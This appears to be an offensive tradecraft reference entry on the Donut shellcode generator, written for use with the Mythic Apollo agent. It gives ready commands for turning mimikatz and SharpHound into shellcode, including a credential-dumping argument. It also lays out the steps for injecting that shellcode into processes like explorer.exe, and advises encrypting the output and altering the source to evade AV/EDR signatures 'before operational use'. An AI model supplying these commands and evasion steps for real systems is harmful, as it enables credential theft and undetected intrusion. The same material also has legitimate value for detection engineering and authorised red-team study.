---
name: Donut
category: defense-evasion
subcategories: [shellcode-generation, pe-to-shellcode, assembly-to-shellcode]
tradecraft_tags: [donut, shellcode, pe-to-shellcode, dotnet, native-exe, conversion, injection]
mitre_attack:
  - id: T1027
    name: Obfuscated Files or Information
source:
  url: https://github.com/TheWover/donut
  license: BSD-3-Clause
  maintained: true
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64, x86]
privilege_required: none
network_required: false
detection_signal: |
  Donut-generated shellcode contains the .NET CLR activation code, VirtualAlloc calls,
  and optionally encryption/obfuscation. EDR memory scanners may detect the Donut
  shellcode loader pattern. The resulting shellcode is usable with Apollo's shinject
  command for in-process injection.
usage_examples:
  - description: Convert a .NET assembly to shellcode
    args: "donut -a 2 -f 1 -o SharpHound_shellcode.bin Seatbelt.exe"
  - description: Convert with encryption and compression (higher evasion)
    args: "donut -a 2 -e 3 -z 1 -f 1 -o output.bin SharpHound.exe"
  - description: Convert with custom assembly arguments
    args: "donut -a 2 -f 1 -p '-c All --ZipFilename out.zip' -o sharphound.bin SharpHound.exe"
  - description: Convert native EXE to shellcode (for shinject)
    args: "donut -a 2 -f 1 -o mimikatz_shellcode.bin mimikatz.exe"
opsec_notes: |
  Donut converts .NET assemblies or native EXEs into position-independent shellcode
  (PIC) that can be injected into any process via Apollo's shinject command or similar.
  This enables: (1) running native EXEs via shinject (not possible with inline_assembly),
  (2) running .NET assemblies with different process creation model than AppDomain.
  Donut shellcode is signatured — use the encryption option (-e) and consider adding
  a custom shellcode loader wrapper.
gotchas: |
  Donut runs on attacker infrastructure (Linux or Windows). The output shellcode
  is injected via Apollo's shinject command. Key considerations:
  - The shellcode includes a mini .NET CLR activator for .NET assemblies
  - Encryption (-e 3) makes the shellcode harder to scan but adds complexity
  - Large assemblies (SharpHound, Rubeus) produce large shellcode (~10-15x original size)
  - Apollo's shinject targets a PID — choose a long-lived target process
related_ttps: [process-injection, inline-execute-pe, inceptor, bofnet]
alternatives: [inceptor, sRDI, pe-reflective-dll]
common_args:
  -a:
    description: Architecture (1=x86, 2=x64, 3=x86+x64)
    typical_values: [2, 3]
    required: true
  -f:
    description: Output format (1=binary, 2=base64, 3=C, 4=ruby, 5=python, 6=powershell)
    typical_values: [1, 2]
  -e:
    description: Encryption level (1=none, 2=random key, 3=Maru encryption)
    typical_values: [1, 3]
  -z:
    description: Compression (1=none, 2=aPLib, 3=LZNT1)
    typical_values: [1, 2]
  -o:
    description: Output shellcode file
    typical_values: ["output.bin", "payload.bin"]
    required: true
  -p:
    description: Command-line arguments to pass to the assembly
    typical_values: ["'-c All --ZipFilename out.zip'", "'sekurlsa::logonpasswords exit'"]
  input:
    description: Input binary (.NET assembly or native PE)
    typical_values: ["SharpHound.exe", "mimikatz.exe"]
    required: true
last_updated: 2026-05-29
---

# Donut

TheWover's position-independent shellcode generator that converts .NET assemblies,
native EXEs, and DLLs into shellcode runnable in any process via memory injection.
Enables scenarios not otherwise possible in Apollo:
- Running native EXEs via shinject (Apollo can't inline_assembly a native PE)
- Running .NET assemblies with a different execution model than AppDomain-based

## Primary Use Cases

### 1. Native EXE → shinject
```
# Convert mimikatz.exe to shellcode:
donut -a 2 -e 1 -f 1 -o mimikatz.bin mimikatz.exe

# Inject via Apollo shinject:
Apollo: shinject <pid> <mimikatz.bin-uuid>
```

### 2. .NET Assembly → shellcode (alternative to inline_assembly)
```
# Convert SharpHound.exe to shellcode with arguments:
donut -a 2 -e 3 -f 1 -p '-c All --ZipFilename out.zip' -o sharphound.bin SharpHound.exe

# Inject into explorer.exe via Apollo:
Apollo: shinject <explorer_pid> <sharphound.bin-uuid>
```

### 3. Encrypted shellcode for AV/EDR bypass
```
donut -a 2 -e 3 -z 1 -f 1 -o encrypted.bin tool.exe
```

## Apollo Workflow

```
1. Run Donut on attacker infrastructure to convert binary
2. Upload resulting .bin shellcode to Mythic file store
3. Apollo shinject <target_pid> <shellcode_uuid>
4. Tool executes in target process
```

## Shellcode Signature Notes

Donut shellcode includes a bootstrap that activates the CLR (for .NET) and calls
the entry point. The bootstrap has known patterns — EDR memory scanners detect
default Donut output. Always use encryption (-e 3) and consider modifying the
Donut source to change the signature before operational use.
